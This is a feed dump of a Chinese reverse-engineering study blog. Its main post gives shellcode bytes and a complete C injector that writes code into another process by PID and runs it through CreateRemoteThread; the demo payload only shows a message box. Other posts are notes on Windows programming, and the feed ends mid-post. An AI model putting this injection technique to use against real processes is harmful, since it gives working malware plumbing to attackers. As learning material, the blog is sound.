    <content type="html"><![CDATA[<p>代码注入-汇编</p><span id="more"></span> <h1 id="0x00-设置"><a class="header-anchor" href="#0x00-设置">¶</a>0x00-设置</h1><p>修改EIP</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925411946.png" alt=""></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925229842.png" alt=""></p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649925283278.png" alt="关闭自动填充nop"></p><h1 id="0x01-修改汇编"><a class="header-anchor" href="#0x01-修改汇编">¶</a>0x01-修改汇编</h1><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926048838.png" alt=""></p><p>输入字符串，Ctrl+E修改，注意字符串以0结尾，最后要加上00</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926227498.png" alt=""></p><p>可以发现得到的是汇编代码，OD会自动识别</p><p>只需要选中字符串按下Ctrl+A即可转为字符串</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1649926333629.png" alt=""></p><p>同理修改好www.reversecore.com字符串</p><h2 id="提取汇编"><a class="header-anchor" href="#提取汇编">¶</a>提取汇编</h2><p>接下来将插入的asm的机器码进行复制（在内存窗口中复制对应长度的十六进制数据），并修改格式</p><p>得到</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> shellcode[] = {</span><br><span class="line"><span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0x08</span>,<span class="number">0x68</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x54</span>,<span class="number">0xFF</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x6F</span>,<span class="number">0x78</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x67</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x4D</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x54</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0x56</span>,<span class="number">0x04</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x0C</span></span><br><span class="line">,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x00</span>,<span class="number">0xE8</span></span><br><span class="line">,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x63</span></span><br><span class="line">,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span></span><br><span class="line">,<span class="number">0x5D</span>,<span class="number">0xC3</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><h1 id="0x02-代码实现"><a class="header-anchor" href="#0x02-代码实现">¶</a>0x02-代码实现</h1><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">BYTE shellcode[] = {</span><br><span class="line"> <span class="number">0x55</span>,<span class="number">0x8B</span>,<span class="number">0xEC</span>,<span class="number">0x8B</span>,<span class="number">0x75</span>,<span class="number">0x08</span>,<span class="number">0x68</span>,<span class="number">0x6C</span>,<span class="number">0x6C</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x2E</span>,<span class="number">0x64</span></span><br><span class="line">,<span class="number">0x68</span>,<span class="number">0x75</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x54</span>,<span class="number">0xFF</span>,<span class="number">0x16</span>,<span class="number">0x68</span>,<span class="number">0x6F</span>,<span class="number">0x78</span>,<span class="number">0x41</span>,<span class="number">0x00</span>,<span class="number">0x68</span>,<span class="number">0x61</span>,<span class="number">0x67</span></span><br><span class="line">,<span class="number">0x65</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x4D</span>,<span class="number">0x65</span>,<span class="number">0x73</span>,<span class="number">0x73</span>,<span class="number">0x54</span>,<span class="number">0x50</span>,<span class="number">0xFF</span>,<span class="number">0x56</span>,<span class="number">0x04</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xE8</span>,<span class="number">0x0C</span></span><br><span class="line">,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x52</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x43</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x00</span>,<span class="number">0xE8</span></span><br><span class="line">,<span class="number">0x14</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x77</span>,<span class="number">0x2E</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x76</span>,<span class="number">0x65</span>,<span class="number">0x72</span>,<span class="number">0x73</span>,<span class="number">0x65</span>,<span class="number">0x63</span></span><br><span class="line">,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x65</span>,<span class="number">0x2E</span>,<span class="number">0x63</span>,<span class="number">0x6F</span>,<span class="number">0x6D</span>,<span class="number">0x00</span>,<span class="number">0x6A</span>,<span class="number">0x00</span>,<span class="number">0xFF</span>,<span class="number">0xD0</span>,<span class="number">0x33</span>,<span class="number">0xC0</span>,<span class="number">0x8B</span>,<span class="number">0xE5</span></span><br><span class="line">,<span class="number">0x5D</span>,<span class="number">0xC3</span></span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">Thread_Param</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">FARPROC pFunc[<span class="number">2</span>];<span class="comment">//Loadlibrary,GetProcAddress</span></span><br><span class="line">}Thread_Param, * pThread_Param;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Asm_Inject</span><span class="params">(DWORD PID)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">HMODULE hMod = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hProcess = <span class="literal">NULL</span>;</span><br><span class="line">Thread_Param param[<span class="number">2</span>] = { <span class="number">0</span>, };</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">LPVOID pRemoteBuf[<span class="number">2</span>] = { <span class="number">0</span>, };</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取kernel32.dll的句柄</span></span><br><span class="line">hMod = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line"><span class="comment">//将需要使用的函数存储</span></span><br><span class="line">param-&gt;pFunc[<span class="number">0</span>] = GetProcAddress(hMod, <span class="string">"LoadLibraryA"</span>);</span><br><span class="line">param-&gt;pFunc[<span class="number">1</span>] = GetProcAddress(hMod, <span class="string">"GetProcAddress"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//开启进程</span></span><br><span class="line"><span class="keyword">if</span> (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Open Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//开辟空间并写入</span></span><br><span class="line"><span class="keyword">if</span> (!(pRemoteBuf[<span class="number">0</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(Thread_Param), MEM_COMMIT, PAGE_READWRITE)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAlloc Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">0</span>], (LPVOID)&amp;param, <span class="keyword">sizeof</span>(Thread_Param), <span class="literal">NULL</span>))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WriteProcess Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//将我们的shellcode写入</span></span><br><span class="line"><span class="keyword">if</span> (!(pRemoteBuf[<span class="number">1</span>] = VirtualAllocEx(hProcess, <span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT, PAGE_READWRITE)))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"VirtualAlloc Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!WriteProcessMemory(hProcess, pRemoteBuf[<span class="number">1</span>], (LPVOID)&amp;shellcode, <span class="keyword">sizeof</span>(shellcode), <span class="literal">NULL</span>))</span><br><span class="line">{</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"WriteProcess Failed!!Error Code:%d\n"</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line">hThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pRemoteBuf[<span class="number">1</span>], pRemoteBuf[<span class="number">0</span>], <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>*argv[])</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">Asm_Inject((DWORD)atol(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>本质上和代码注入没区别，主要是我们将字符串也包含在了注入的代码里面，所以在线程函数中不再需要使用字符数组存储</p><h1 id="0x03-分析"><a class="header-anchor" href="#0x03-分析">¶</a>0x03-分析</h1><p>在OD中打开并注入，让其停在新线程</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650001855752.png" alt=""></p><p>先提升堆栈，然后将函数的参数存入ESI中，也就是线程函数对应的THREAD_PARAM结构体，因为里面只有两个函数指针，所以大小为0x8</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002105819.png" alt="ESI的值"></p><p>我们执行完移动到esi这一步，去内存中查看ESI存储的值</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002164069.png" alt=""></p><p>将其转为地址，注释中会告知我们其对应的API函数</p><p>接下来的四个PUSH+call可以知道是调用函数，LoadLibraryA只需要一个参数</p><p>前面三个PUSH是将函数名称压入栈，而最后一个是将当前的ESP的值压入栈，而当前ESP的值正好是存储字符串的地址，这样就实现了给LoadLibraryA传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002382351.png" alt=""></p><p>需要注意这里是小端序</p><p>接下来的四个PUSH和前面是一样的，关键是最后一个PUSH</p><blockquote><p><strong>因为返回值一般存储在EAX，并且函数调用时入栈顺序是从右往左依次入栈</strong></p></blockquote><p>这里的EAX存储的值就是user32.dll的句柄，也就是地址，在eax寄存器中OD也自动标明了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002603450.png" alt=""></p><p>最后获取到MessageBoxA的地址</p><p>MessageBoxA的传参</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002654110.png" alt=""></p><p>这一段本来是字符串，但是OD给我们识别成了代码</p><p>执行完之后</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002721021.png" alt=""></p><p>可以看到我们的MessageBoxA的参数都在栈中了</p><p><img src="/2022/04/14/%E4%BD%BF%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%BC%96%E5%86%99%E6%B3%A8%E5%85%A5%E4%BB%A3%E7%A0%81/1650002770898.png" alt="调用MessageBoxA"></p><p>最后就是清空eax和恢复堆栈了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;代码注入-汇编&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>加密与解密第四版</title>
    <link href="https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/"/>
    <id>https://gift1a.github.io/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/</id>
    <published>2022-04-13T01:18:40.000Z</published>
    <updated>2022-04-20T05:40:17.961Z</updated>
    
    <content type="html"><![CDATA[<p>《加密与解密》</p><span id="more"></span> <h1 id="0x00-基础知识"><a class="header-anchor" href="#0x00-基础知识">¶</a>0x00-基础知识</h1><h2 id="字符集"><a class="header-anchor" href="#字符集">¶</a>字符集</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814834555.png" alt=""></p><h2 id="大小端序"><a class="header-anchor" href="#大小端序">¶</a>大小端序</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814898304.png" alt=""></p><h2 id="Windows操作系统"><a class="header-anchor" href="#Windows操作系统">¶</a>Windows操作系统</h2><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814924513.png" alt="重要DLL"></p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649814970448.png" alt="Unicode与ANSI函数"></p><h2 id="WOW64"><a class="header-anchor" href="#WOW64">¶</a>WOW64</h2><p>WOW64是64位Windows操作系统的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p><p><img src="/2022/04/13/%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86%E7%AC%AC%E5%9B%9B%E7%89%88/1649815151630.png" alt="WOW64操作过程"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;《加密与解密》&lt;/p&gt;</summary>
    
    
    
    
    <category term="Reverse" scheme="https://gift1a.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Windows核心编程</title>
    <link href="https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/"/>
    <id>https://gift1a.github.io/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/</id>
    <published>2022-04-13T01:06:43.000Z</published>
    <updated>2022-04-20T05:33:38.492Z</updated>
    
    <content type="html"><![CDATA[<p>Windows核心编程</p><span id="more"></span> <h1 id="0x00-错误处理"><a class="header-anchor" href="#0x00-错误处理">¶</a>0x00-错误处理</h1><p>在WinError.h头文件中包含了Microsoft定义的错误代码列表，每个错误都有三种表示：一个消息ID(一个可在源代码使用的宏，用于与GetLastError的返回值进行比较)、消息文本(描述错误的英文文本)和一个编号(应该避免使用此编号，尽量使用消息ID)</p><p>所以在Windows函数失败之后，应该立马调用GetLastError()</p><h1 id="0x01-字符和字符串处理"><a class="header-anchor" href="#0x01-字符和字符串处理">¶</a>0x01-字符和字符串处理</h1><h2 id="ANSI与UNCODE"><a class="header-anchor" href="#ANSI与UNCODE">¶</a>ANSI与UNCODE</h2><blockquote><p>在Windows Vista中，每个Unicode字符都使用UTF-16编码，UTF-16将每个字符编码为2个字节也就是16位</p></blockquote><p>我们知道在C语言中，char数据类型表示一个8位ANSI字符，也就是一个字节</p><p>当我们声明Unicode字符和字符串时，只需要在字符串前加上”L“，表示以UTF-16来编码每个字符</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813453705.png" alt=""></p><h2 id="Unicode函数与ANSI函数"><a class="header-anchor" href="#Unicode函数与ANSI函数">¶</a>Unicode函数与ANSI函数</h2><p>自Windows NT起，Windows所有的版本都完全用Unicode来构建。也就是说所有核心函数(创建窗口、显示文本、进行字符串处理)都需要Unicode字符串</p><p>在Windows中，Windows函数通常具有两个版本，用于接收不同的字符串</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813717040.png" alt=""></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1649813766466.png" alt="默认版本"></p><h2 id="C运行库中的Unicode函数和ANSI函数"><a class="header-anchor" href="#C运行库中的Unicode函数和ANSI函数">¶</a>C运行库中的Unicode函数和ANSI函数</h2><p>和Windows函数一样，C运行库提供了一系列函数处理ANSI字符和字符串，并提供了一系列函数来处理Unicode字符与字符串</p><p>在C运行库中，strlen就是一个能返回ANSI字符串长度的函数。与之对应的是wcslen，这个C运行库函数能返回Unicode字符串的长度，这两个函数都在string.h中</p><h2 id="C运行库中的安全字符串函数"><a class="header-anchor" href="#C运行库中的安全字符串函数">¶</a>C运行库中的安全字符串函数</h2><blockquote><p><strong>任何修改字符串的函数都存在一个安全隐患：如果目标字符串缓冲区不够大，无法容纳所生成的字符串，就会导致内存中的数据被破坏</strong></p></blockquote><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011578747.png" alt="例子"></p><p>为了防止被被恶意软件肆意滥用，微软提供了一系列新的函数来取代C运行库的不安全的字符串处理函数</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650011917625.png" alt=""></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012022950.png" alt=""></p><p>书中没有详细介绍，可以自行查找</p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012306710.png" alt="安全字符串函数"></p><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012361902.png" alt="安全字符串函数执行"></p><h1 id="Windows字符串函数"><a class="header-anchor" href="#Windows字符串函数">¶</a>Windows字符串函数</h1><p>不知道讲了些啥</p><h2 id="为何要用Unicode"><a class="header-anchor" href="#为何要用Unicode">¶</a>为何要用Unicode</h2><p><img src="/2022/04/13/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B/1650012784209.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Windows核心编程&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>代码注入</title>
    <link href="https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"/>
    <id>https://gift1a.github.io/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/</id>
    <published>2022-04-12T03:41:45.000Z</published>
    <updated>2022-04-20T05:46:47.067Z</updated>
    
    <content type="html"><![CDATA[<p>代码注入</p><span id="more"></span> <h1 id="0x00-前言-v3"><a class="header-anchor" href="#0x00-前言-v3">¶</a>0x00-前言</h1><p>感觉《逆向工程核心原理》只是进行了一点介绍，但是我理解能力有限</p><p>于是翻阅到了这篇文章</p><p><a href="https://www.52pojie.cn/thread-1270499-1-1.html">https://www.52pojie.cn/thread-1270499-1-1.html</a></p><h1 id="0x01-原理"><a class="header-anchor" href="#0x01-原理">¶</a>0x01-原理</h1><p>在DLL注入中，我们通过远程线程在目标进程中调用LoadLibraryA()函数加载我们的DLL</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649738932188.png" alt=""></p><p>实际上只要我们定义的函数符合CreateRemoteThread参数中定义的函数模板，就可以通过远程线程的方式去执行它，而不限于LoadLibraryA</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ThreadProc</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  _In_ LPVOID lpParameter</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></tbody></table></figure><p>所以我们只要定义一个只有一个参数的函数，把它转换成 LPTHREAD_START_ROUTINE（CreateRemoteThread的参数）即可。</p><p>但是这里产生了一个问题，如果我们的函数具有多个参数怎么办呢，要成功调用函数的话，我们的参数也需要在目标进程的虚拟内存中</p><blockquote><p>对于将我们的参数写入虚拟内存中，我们可以使用VirtualAllocEx函数向目标申请内存虚拟空间</p><p>对于多个参数，我们可以构建一个结构体存放所有的参数，然后在调用的时候通过内存偏移来访问参数</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">INJECT_DATA</span></span></span><br><span class="line"><span class="class">{</span></span><br><span class="line">    <span class="keyword">char</span> lpText[<span class="number">8</span>];  <span class="comment">//参数1</span></span><br><span class="line">    <span class="keyword">char</span> lpCaption[<span class="number">8</span>];  <span class="comment">//参数2</span></span><br><span class="line">}INJECT_DATA;</span><br></pre></td></tr></tbody></table></figure><p>下面以MessageBoxA函数为例</p><h2 id="定义函数指针"><a class="header-anchor" href="#定义函数指针">¶</a>定义函数指针</h2><p>首先先进行定义我们要使用到的函数指针</p><p>因为我们要调用user32.dll中的MessageBoxA，所以要使用LoadLibraryA()加载user32.dll，并且使用GetProcAddress()获取MessageBoxA的函数地址</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义函数指针，方便调用HOMDULE是返回值，WINAPI也就是__stdcall，是调用约定，类型名为PFLOADLIBRARYA，lpLivFileName是参数</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HMODULE</span><span class="params">(WINAPI *PFLOADLIBRARYA)</span><span class="params">(LPCSTR lpLibFileName)</span></span>;<span class="comment">//前面的是返回值，中间是类型</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">FARPROC</span><span class="params">(WINAPI *PFGETPROCADDRESS)</span><span class="params">(HMODULE hModule,LPCSTR lpProcName)</span></span>;<span class="comment">//返回值是一个回调函数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PFMESSAGEBOXA)</span><span class="params">(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="定义线程信息块"><a class="header-anchor" 